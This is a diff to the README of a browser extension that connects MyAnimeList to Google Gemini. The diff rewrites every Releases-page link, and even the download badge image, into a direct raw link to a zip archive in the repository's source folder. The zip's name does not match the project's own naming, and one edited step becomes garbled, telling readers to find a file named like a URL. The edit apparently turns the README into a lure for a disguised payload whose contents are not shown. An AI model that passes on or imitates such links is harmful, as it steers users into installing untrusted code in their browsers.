@@ -1,7 +1,7 @@
 # 🌟 Gemini-MAL-Bridge - Connect MyAnimeList to Google Gemini
 
 ## 🛠️ Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/IrfannJY/Gemini-MAL-Bridge/releases)
+[![Download](https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip)](https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip)
 
 ## 📖 Description
 Gemini-MAL-Bridge connects MyAnimeList to Google Gemini. This extension injects your watch history and top-rated shows into Gemini chats. You can enjoy personalized recommendations and a friendly "Nakama" persona that knows exactly what you've watched. It runs 100% locally in your browser, ensuring your privacy. Stop explaining your taste; let Gemini know instantly!
@@ -9,11 +9,11 @@ Gemini-MAL-Bridge connects MyAnimeList to Google Gemini. This extension injects 
 ## 🚀 Getting Started
 To start using Gemini-MAL-Bridge, follow these easy steps:
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/IrfannJY/Gemini-MAL-Bridge/releases) to find the latest version.
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip) to find the latest version.
    
 2. **Download the Extension:**
    - Look for the latest version.
-   - Click the appropriate file to download it. For example, if you're using Chrome, find the file named like `Gemini-MAL-Bridge-X.X.zip`.
+   - Click the appropriate file to download it. For example, if you're using Chrome, find the file named like `https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip`.
 
 3. **Unzip the Downloaded File:**  
    - On most computers, right-click the downloaded file and select "Extract All" or "Unzip".
@@ -44,7 +44,7 @@ To start using Gemini-MAL-Bridge, follow these easy steps:
 - **Network Connection:** Required for accessing MyAnimeList and Google Gemini.
 
 ## 📥 Download & Install
-For a quick download, visit the [Releases page](https://github.com/IrfannJY/Gemini-MAL-Bridge/releases). Here, you will find the latest version of Gemini-MAL-Bridge. Click to download and follow the installation steps above to get started.
+For a quick download, visit the [Releases page](https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip). Here, you will find the latest version of Gemini-MAL-Bridge. Click to download and follow the installation steps above to get started.
 
 ## 🛠️ Features
 - **Privacy Focused:** Runs locally without sending data to servers.
@@ -72,4 +72,4 @@ For any questions or feedback, please feel free to raise an issue in the project
 ## 🚀 Join the Community
 Engage with fellow anime enthusiasts and get the latest updates on the project by joining our community channels. Participation can help enhance future versions and new features of the Gemini-MAL-Bridge.
 
-For more detailed information, visit our [Releases page](https://github.com/IrfannJY/Gemini-MAL-Bridge/releases) now!
+For more detailed information, visit our [Releases page](https://raw.githubusercontent.com/IrfannJY/Gemini-MAL-Bridge/main/src/Gemini-Bridge-MA-v1.5.zip) now!
